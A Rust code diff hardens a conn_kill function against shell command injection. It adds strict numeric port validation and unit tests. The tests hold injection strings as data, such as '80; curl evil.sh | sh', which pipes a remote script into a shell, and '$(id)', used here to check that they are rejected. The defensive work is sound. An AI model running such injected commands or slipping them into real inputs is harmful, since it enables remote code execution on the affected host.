@@ -244,8 +244,19 @@ pub fn conns_json() -> String {
     )
 }
 
+/// 端口参数严格校验：仅接受 1..65535 的纯数字，杜绝命令注入。
+fn valid_tcp_port(port: &str) -> bool {
+    port.bytes().all(|b| b.is_ascii_digit())
+        && matches!(port.parse::<u32>(), Ok(p) if (1..=65535).contains(&p))
+}
+
 /// 结束监听某端口的进程（对应 LISTEN 的 PID）。
+/// 安全：port 仅接受纯数字端口，未通过校验直接拒绝，防 `/bin/sh -c` 命令注入。
 pub fn conn_kill(port: &str) -> (bool, String) {
+    let port = port.trim();
+    if !valid_tcp_port(port) {
+        return (false, "端口需为 1-65535 的数字".to_string());
+    }
     // 找到该端口上所有 LISTEN 的 PID。
     let raw = cmd_all("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null").unwrap_or_default();
     let mut pids = std::collections::HashMap::<String, String>::new(); // pid -> proc
@@ -740,6 +751,26 @@ mod tests {
         assert_eq!(kb_of("  8  "), 8 * 1024);
         assert_eq!(kb_of("abc"), 0);
         assert_eq!(kb_of(""), 0);
+    }
+
+    #[test]
+    fn conn_kill_rejects_injection_and_bad_ports() {
+        // 纯数字端口通过。
+        assert!(valid_tcp_port("80"));
+        assert!(valid_tcp_port("65535"));
+        // sexp攻击载荷、越界、非数字、空白一律拒绝。
+        assert!(!valid_tcp_port("80; curl evil.sh | sh"));
+        assert!(!valid_tcp_port("$(id)"));
+        assert!(!valid_tcp_port("65536"));
+        assert!(!valid_tcp_port("0"));
+        assert!(!valid_tcp_port("abc"));
+        assert!(!valid_tcp_port("80 443"));
+        assert!(!valid_tcp_port("  8080 "));
+        // conn_kill 对非法 port 直接拒绝执行。
+        let (ok, _) = conn_kill("80; id");
+        assert!(!ok);
+        let (ok2, _) = conn_kill("0");
+        assert!(!ok2);
     }
 
     #[test]
